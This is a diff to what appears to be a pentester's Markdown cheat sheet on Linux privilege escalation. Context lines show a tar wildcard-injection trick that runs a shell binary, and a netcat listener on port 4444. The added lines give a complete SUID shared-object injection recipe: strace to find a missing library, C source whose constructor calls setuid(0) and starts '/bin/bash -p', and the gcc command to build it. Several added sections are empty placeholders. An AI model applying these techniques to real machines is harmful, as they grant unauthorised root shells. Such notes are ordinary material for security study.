@@ -132,7 +132,45 @@ touch /home/user/--checkpoint=1 # target machine
 touch /home/user/--checkpoint-action=exec=shell.elf # target machine
 nc -nvlp 4444 # our kali
 ```
-#### The following list shows the most commons file extensions for linux:
+## SUID_SGID ✅
+### Known Exploits ✡️
+```bash
+searchsploit <name app>
+```
+### Shared Object Injection ✡️
+```bash
+file /usr/local/bin/suid-so # setuid setgid ELF 64-bit LSB executable
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+mkdir /home/user/.config
+nano /tmp/libcalc.c ⬇️⬇️⬇️⬇️
+-------------------
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+-------------------
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /tmp/libcalc.c
+```
+
+### Environment Variables ✡️
+```bash
+
+```
+### Abusing Shell Features (#1) ✡️
+```bash
+
+```
+### Abusing Shell Features (#2) ✡️
+```bash
+
+```
+
+#### The following list shows the most commons file extensions for linux: ❗️☪️
 ```bash
 .a   : a static library ;
 .au    : an audio file ;
